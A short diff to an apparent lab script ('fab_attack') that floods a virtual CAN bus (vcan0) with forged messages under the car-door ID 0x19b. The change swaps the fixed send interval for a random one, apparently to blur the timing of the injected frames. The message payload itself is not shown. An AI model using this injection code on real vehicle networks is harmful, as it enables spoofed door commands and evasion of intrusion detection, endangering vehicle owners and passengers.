@@ -1,5 +1,6 @@
 import can 
 import time
+import random
 
 CAN_INTERFACE = "vcan0"  
 ID = 0x19b #doors ID 
@@ -12,7 +13,7 @@ def fab_attack(bus):
         while True:
             bus.send(msg)
             print(f"Fab msg: {msg}")
-            time.sleep(0.5)
+            time.sleep(random.uniform(0, 1))
     except KeyboardInterrupt:
         print("Interruption of messages by keyboard")
     except can.CanError as e:
